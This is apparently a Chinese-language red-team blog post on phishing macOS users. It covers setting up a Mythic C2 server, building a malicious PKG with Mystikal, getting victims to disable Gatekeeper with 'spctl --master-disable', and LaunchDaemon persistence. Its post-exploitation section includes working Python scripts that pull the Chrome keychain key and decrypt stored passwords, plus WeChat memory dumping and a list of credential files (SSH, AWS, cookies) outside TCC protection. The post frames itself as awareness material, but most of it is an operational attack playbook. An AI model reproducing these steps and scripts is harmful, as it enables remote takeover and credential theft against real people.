---
title: "Macos钓鱼实践"
date: 2023-03-27T08:08:03+08:00
draft: false
author: "r0fus0d"
categories: ["技术"]

---

本文旨在科普macos平台的安全风险和钓鱼手段。

{{% admonition info "info" %}}
本文之前在公众号上发过,这里单纯备份一份
{{% /admonition %}}

<!--more-->

---

## C2搭建

对于macos的远控工具市面上有许多,这里就简单介绍Mythic这款c2框架的搭建

```
git clone https://github.com/its-a-feature/Mythic

cd Mythic
./mythic-cli install github https://github.com/MythicAgents/poseidon
./mythic-cli install github https://github.com/MythicAgents/Apollo
./mythic-cli install github https://github.com/MythicC2Profiles/http
./mythic-cli start

./mythic-cli status
cat .env | grep 'MYTHIC_ADMIN'
```

当`mythic_server`容器第一次启动时，会经历一个初始化步骤，使用`Mythic/.env`中的密码和用户名创建`mythic_admin_user`用户。

启动完毕后访问 https://ip:7443

账号密码从配置文件里面查

登录后可以看到有安装Poseidon和apfell这2块payload,可以用于macos的payload生成

![](../../img/mac/Untitled.png)

---

## shell制作

macos的shell种类挺多,除了app、pkg还有dmg、office宏等形式,这里图个方便,就用Mystikal配合Mythic制作一个pkg格式的shel

### Mystikal制作PKG文件

```
git clone https://github.com/D00MFist/Mystikal.git
cd Mystikal
sudo pip3 install -r requirements.txt

修改 Settings/MythicSettings.py 的配置
```

![](../../img/mac/Untitled%201.png)

输入完,会产生如下目录结构

```
├── simple-package
│   └── scripts
│       ├── files
│       │   ├── SimpleStarter.js
│       │   └── com.simple.plist
│       ├── postinstall
│       └── preinstall
└── simple_LD.pkg
```

其中的`simple_LD.pkg`就是我们发给目标的shell了

### Gatekeeper机制

当我们实际发送给目标打开时,就会发现遇到问题了

![](../../img/mac/Untitled.jpeg)

这是因为Gatekeeper机制造成的

如果可执行文件没有经过认证，Gatekeeper会提示用户该文件不能运行，因为它是未签名的。要运行未签名的可执行文件，用户必须右键单击文件，然后单击打开，而不是双击。

还有部分情况下需要在设置里进行信任才可以打开,右键打开的方式就不起作用了

![](../../img/mac/Untitled%201.jpeg)

另外有一点，从通讯工具等应用下载的可执行文件都会提示这个框

![](../../img/mac/Untitled%202.png)

这也是Gatekeeper造成的，当从 Internet 下载可执行文件时，它们会标有属性`com.apple.quarantine`，该属性会在文件首次运行时触发gatekeeper。

![](../../img/mac/Untitled%203.png)

可以看到我们的”apk渗透测试.zip”文件来自wechat应用。

但是`com.apple.quarantine`属性的添加是看应用的，比如从微信、浏览器等应用下载的文件会带这个属性，而从curl应用下载的文件是不带这个属性的.

![](../../img/mac/Untitled%204.png)

可以通过xattr命令删除`com.apple.quarantine`属性

```
xattr -d com.apple.quarantine feishu_shell2.dmg
xattr -l feishu_shell2.dmg
```

![](../../img/mac/Untitled%205.png)

在macos Catalina及之前的版本可以通过`defaults write com.apple.LaunchServices "LSQuarantine" -bool "false"`命令禁用quarantine信息提示,在Big Sur版本之后该方法不可用

在[https://www.jamf.com/blog/cryptojacking-macos-malware-discovered-by-jamf-threat-labs/](https://www.jamf.com/blog/cryptojacking-macos-malware-discovered-by-jamf-threat-labs/)分享的案例中,攻击者通过诱导受害者关闭Gatekeeper检查以绕过不安全提示

```
If you have issues with image (annoying image/application is damaged messages pretending you cannot open things) run in Terminal: sudo spctl --master-disable
```

```
sudo spctl --master-disable
# 此命令用于完全禁用 Gatekeeper 功能

sudo spctl --master-enable
# 启用 Gatekeeper 功能
```

当我们用花言巧语诱导目标运行这个禁用命令后,目标在点击安装包基本就上线了(当然右键-左键运行也是可以的)

![](../../img/mac/Untitled%206.png)

上线后会落地1个plist 1个shell,后续结束远控可以直接删除,这个是调用osascript加载js

```
/Library/LaunchDaemons/com.simple.agent.plist
/Library/Application Support/SimpleStarter.js
```

---

## 权限维持

在上线后我们就需要做权限维持了,不然shell掉了或者用户电脑重启了就前功尽弃，这里用pkg格式的方式其实就已经帮我们做好了权限维持

这里简单介绍下LaunchDaemons的概念

### LaunchDaemon

在 Linux 上有一个大家惯用的 systemd，在 MacOS 上有一个与之相对应的工具，launchd。

macos通过后缀名为 `.plist` 的配置文件追加 launchd 的管理项。添加和删除，都是用 `.plist` 文件来完成的。

`.plist` 文件存在于下面的文件夹中，分别是

| 类型 |  | 说明 |
| --- | --- | --- |
| User Agents | ~/Library/LaunchAgents | 为当前登录用户启动 |
| Global Agents | /Library/LaunchAgents | 为当前登录用户启动 |
| Global Daemons | /Library/LaunchDaemons | root 或者通过 UserName 配置指定的用户 |
| System Agents | /System/Library/LaunchAgents | 当前登录用户 |
| System Daemons | /System/Library/LaunchDaemons | root 或者通过 UserName 配置指定的用户 |

而Mystikal生成的shell上线后会落地一个plist到用户的/Library/LaunchDaemons/com.simple.agent.plist位置

可以回头看一下Mystikal生成的payload里的preinstall

```
#!/bin/bash
cp files/com.simple.plist "/Library/LaunchDaemons/com.simple.agent.plist"
cp files/SimpleStarter.js "/Library/Application Support/SimpleStarter.js"
exit 0
```

可以看到其实就是将用于权限维持和拉起shell的com.simple.plist移到LaunchDaemons中用于持久化

在看下com.simple.plist

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.simple.agent</string>
    <key>ProgramArguments</key>
    <array>
    <string>osascript</string>
    <string>/Library/Application Support/SimpleStarter.js</string>
    </array>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
```

简单明了,就是调用osascript运行本地的js

这里在科普下`LaunchAgents`和`LaunchDaemons`2种方式的区别,就是`LaunchAgents`是普通用户，`LaunchDaemons`是root用户

---

## 后渗透

上线后就需要进行后渗透了，包括信息收集、凭证抓取、横向操作等等

### 浏览器信息抓取

这里参考**HackBrowserData项目**和网上类似功能的脚本手动来抓取目标主机chrome浏览器的信息

- https://github.com/moonD4rk/HackBrowserData

首先mac下获取chrome储存的浏览器密码，需要Login Data和 Login Data 的加密密钥，加密密钥存在钥匙串中。

下载 `~/Library/Application Support/Google/Chrome/Default/Cookies` 并在离线状态下解密文件。

```
# 查看下这个文件
file ~/Library/Application\ Support/Google/Chrome/Default/Cookies

下载到本地
```

获取加密密钥

```
security 2>&1 > /dev/null find-generic-password -ga 'Chrome' | awk '{print $2}'
```

在用户侧会弹框输入密码后可以看到加密密钥,这里测试直接下发命令不能触发弹框,可以通过脚本去触发

![](../../img/mac/Untitled%207.png)

![](../../img/mac/Untitled%208.png)

触发弹框提取的脚本

```
import sqlite3, os, binascii, subprocess, base64, sys, hashlib, glob

loginData = glob.glob("%s/Library/Application Support/Google/Chrome/Profile*/Login Data" % os.path.expanduser("~"))
if len(loginData) == 0:
    loginData = glob.glob("%s/Library/Application Support/Google/Chrome/Default/Login Data" % os.path.expanduser("~")) #attempt default profile

print(loginData[0])
safeStorageKey = subprocess.check_output("security 2>&1 > /dev/null find-generic-password -ga 'Chrome' | awk '{print $2}'", shell=True).decode().replace("\n", "").replace("\"", "")
# .replace("\n", "").replace("\"", "")
print(safeStorageKey)

if safeStorageKey == "":
    print("ERROR getting Chrome Safe Storage Key")
    sys.exit()
```

获取chrome浏览器密码文件路径，和加密密钥

![](../../img/mac/Untitled%209.png)

本地解密的脚本

```
import sqlite3, os, binascii, subprocess, base64, sys, hashlib, glob

def chromeDecrypt(encrypted_value, iv, key=None): #AES decryption using the PBKDF2 key and 16x ' ' IV, via openSSL (installed on OSX natively)
    hexKey = binascii.hexlify(key)
    hexEncPassword = base64.b64encode(encrypted_value[3:])
    try: #send any error messages to /dev/null to prevent screen bloating up
        decrypted = subprocess.check_output("openssl enc -base64 -d -aes-128-cbc -iv '%s' -K %s <<< %s 2>/dev/null" % (iv, hexKey, hexEncPassword), shell=True)
    except Exception as e:
        decrypted = "ERROR retrieving password"
    return decrypted

def chromeProcess(safeStorageKey, loginData):
    iv = ''.join(('20',) * 16) #salt, iterations, iv, size - https://cs.chromium.org/chromium/src/components/os_crypt/os_crypt_mac.mm
    key = hashlib.pbkdf2_hmac('sha1', safeStorageKey, b'saltysalt', 1003)[:16]
    fd = os.open(loginData, os.O_RDONLY) #open as read only
    database = sqlite3.connect('/dev/fd/%d' % fd)
    os.close(fd)
    sql = 'select username_value, password_value, origin_url from logins'
    decryptedList = []
    with database:
        for user, encryptedPass, url in database.execute(sql):
            if user == "" or (encryptedPass[:3] != b'v10'): #user will be empty if they have selected "never" store password
                continue
            else:
                urlUserPassDecrypted = (url.encode('ascii', 'ignore'), user.encode('ascii', 'ignore'), chromeDecrypt(encryptedPass, iv, key=key).encode('ascii', 'ignore'))
                decryptedList.append(urlUserPassDecrypted)
    return decryptedList

#print(chromeProcess(safeStorageKey,loginData[0]))
print(chromeProcess("Yysssssssssssssssss=","/tmp/aaadatabase"))
#print(chromeProcess("key","/Users/user/Library/Application Support/Google/Chrome/Default/Login Data"))
```

这里我把Login Data复制到本地/tmp/aaadatabase,避免出现****`sqlite3.OperationalError: database is locked`****报错

![](../../img/mac/Untitled%2010.png)

![](../../img/mac/Untitled%2011.png)

### Keychain

在抓取的过程中我们可以看到，会弹框要求输入密码，这里科普一下macos的 Keychain概念

Keychain类似与Windows上的LSASS，并保存了应用程序的密码和密钥等秘密。例如，应用程序可能会加密其存储在磁盘上的文件，并将这些文件的解密密钥存储在钥匙串中。

系统钥匙串位于`/Library/Keychains/System.keychain`，用户的钥匙串位于`~/Library/Keychains/login.keychain-db`。

我们可以下载用户的钥匙串，但其中的密码将使用用户的密码进行加密,所以我们下载的目标的chrome信息也是通过用户密码进行加密的，所以我们需要用`security 2>&1 > /dev/null find-generic-password -ga 'Chrome' | awk '{print $2}'`来获取加密密钥

### 微信信息

这里参考巴斯.zznQ师傅文章里的方法，通过(frida-go)从内存中读取进行解密

- [https://blog.macoder.tech/macOS-6faf0534323c42259f5277bd95d35c43](https://blog.macoder.tech/macOS-6faf0534323c42259f5277bd95d35c43)

安装frida-go

```
下载frida对应的frida-core-devkit

sudo cp libfrida-core.a /usr/local/lib/libfrida-core.a
sudo mkdir -p /usr/local/include
sudo cp frida-core.h /usr/local/include/frida-core.h
```

打包成单个 main.go 文件

```
go build -ldflags '-w -s'
```

![](../../img/mac/Untitled%2012.png)

![](../../img/mac/Untitled%2013.png)

### **System Integrity Protection (SIP)**

但是，在实际测试时又遇到了一个问题

![](../../img/mac/Untitled%2014.png)

这是因为由于SIP限制,微信开启了Hardened Runtime导致frida无法访问到微信

那么SIP又是什么?

系统完整性保护（SIP）又称“rootless”，通过 Rootless，即使第三方程序获取了系统 Root 权限，也做不了以下事情。

- **文件系统保护** 系统中重要的目录与文件，不能被第三方应用程序任意修改。例如 /System /bin /sbin /usr 等目录中的文件，第三方程序即使获取了 Root 权限也不可修改。系统中所有被保护的系统目录及程序列表可查看文件`/System/Library/Sandbox/rootless.conf`

    ![](../../img/mac/Untitled%2015.png)


- **运行时保护** 向一个系统进程中注入代码与修改磁盘上受保护的文件一样，都是会失败的。受系统保护的程序与使用苹果私有的 entitlements 签名的程序，在运行时都被内核标记为 restricted，在最新的系统中，开发者再也不能直接使用 task_for_pid() / processor_set_task() 来对受保护的进程进行操作了，会直接返回 EPERM 错误。

    通过 `restricted` 标志可以识别受 SIP 保护的文件。

    ```
    ls -laO [PATH]
    ```

    ![](../../img/mac/Untitled%2016.png)

- **内核扩展限制** 第三方开发的 kext 内核扩展必须经过签名之后放到 `/Library/Extensions` 目录下。

可以恢复模式下通过 `csrutil disable` 禁用 SIP，在常规钓鱼场景中很难引诱用户这么做，不过一般使用mac的开发人员会主动关闭sip。

### 用户目录/屏幕信息

当我们要在目标电脑上截屏或者访问用户目录下的一些文件时,又会发现有弹框了

![](../../img/mac/Untitled%2017.png)

而这是mac的tcc机制造成的，tcc又是啥🤔️

### **Transparency, Consent, and Control (TCC)**

TCC是macOS上的隐私功能，自v10.14+开始实施，当应用程序尝试访问某些资源（如相机和某些文件夹，包括`Desktop`, `Downloads`, `Documents`和驱动器/卷）时，会提示用户明确授予权限。

尝试访问受TCC保护的资源而没有权限可能会有弹框提示，导致用户察觉到shell的存在。以下是一些未受TCC保护的有用文件：

- 主目录中的隐藏文件和文件夹：`~/.aws/*`、`~/.ssh/*`、`~/.bash_history`、`~/.zsh_history`。
- 用户应用程序数据 — `〜/Library/Application Support/*`
- Cookie 文件 — `~/Library/Application Support/Google/Chrome/Default/Cookies` , `~/Library/Containers/com.tinyspeck.slackmacgap/Data/Library/Application Support/Slack/Cookies`

浏览“设置”-“隐私与安全”，可以查看 TCC 权限。系统 TCC 数据库位于 `/Library/Application Support/com.apple.TCC/TCC.db`，每个用户都有一个位于 `~/Library/Application Support/com.apple.TCC/TCC.db` 的 TCC 数据库。

![](../../img/mac/Untitled%2018.png)

我们需要截屏录屏就是需要tcc中屏幕录制权限了。

## 总结

在macOS系统中，钓鱼攻击是一种常见的网络攻击方式，企业用户需要了解黑客的攻击方式，并采取相应的防御措施来保护自己的安全。本篇科普文章详细介绍了黑客如何进行macOS钓鱼攻击，包括常见的攻击方式和识别方法，希望能帮助企业用户更好地了解钓鱼攻击的特点和危害，掌握防御技巧，从而有效地预防钓鱼攻击对企业安全的威胁。